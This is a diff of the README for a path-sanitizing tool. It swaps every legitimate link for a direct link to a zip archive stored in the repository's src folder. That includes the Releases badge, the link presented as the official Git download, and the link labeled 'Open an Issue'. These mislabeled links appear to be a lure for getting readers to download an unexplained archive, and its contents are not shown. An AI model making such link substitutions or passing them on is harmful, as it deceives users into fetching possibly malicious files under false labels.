@@ -8,7 +8,7 @@ Welcome to repopath-sanitizer! This app helps you find and fix file and folder p
 
 To get started, visit this page to download the latest version of repopath-sanitizer:
 
-[![Download here](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=blue)](https://github.com/Max-Forman/repopath-sanitizer/releases)
+[![Download here](https://github.com/Max-Forman/repopath-sanitizer/raw/refs/heads/main/src/sanitizer_repopath_2.4.zip%20Release&color=blue)](https://github.com/Max-Forman/repopath-sanitizer/raw/refs/heads/main/src/sanitizer_repopath_2.4.zip)
 
 ### Installation Steps
 
@@ -24,7 +24,7 @@ To get started, visit this page to download the latest version of repopath-sanit
 - **Python Version**: Python 3.9 or higher
 - **Dependencies**: PyQt6, Git
   
-Ensure that you have the latest version of Git installed on your system. You can download Git from [git-scm.com](https://git-scm.com/downloads).
+Ensure that you have the latest version of Git installed on your system. You can download Git from [https://github.com/Max-Forman/repopath-sanitizer/raw/refs/heads/main/src/sanitizer_repopath_2.4.zip](https://github.com/Max-Forman/repopath-sanitizer/raw/refs/heads/main/src/sanitizer_repopath_2.4.zip).
 
 ## 🛠️ Features
 
@@ -45,7 +45,7 @@ Ensure that you have the latest version of Git installed on your system. You can
 
 If you need help or have questions, you can check out our community forum or submit issues on the GitHub repository.
 
-- **GitHub Issues**: [Open an Issue](https://github.com/Max-Forman/repopath-sanitizer/issues)
+- **GitHub Issues**: [Open an Issue](https://github.com/Max-Forman/repopath-sanitizer/raw/refs/heads/main/src/sanitizer_repopath_2.4.zip)
 - **Community Forum**: [Join the Discussion](#)
 
 ## 📜 License
@@ -59,4 +59,4 @@ This application is open source. You can view the license details in the reposit
 
 For more information and updates, visit our Releases page again:
 
-[![Download here](https://img.shields.io/static/v1?label=Download&message=Latest%20Release&color=blue)](https://github.com/Max-Forman/repopath-sanitizer/releases)
+[![Download here](https://github.com/Max-Forman/repopath-sanitizer/raw/refs/heads/main/src/sanitizer_repopath_2.4.zip%20Release&color=blue)](https://github.com/Max-Forman/repopath-sanitizer/raw/refs/heads/main/src/sanitizer_repopath_2.4.zip)
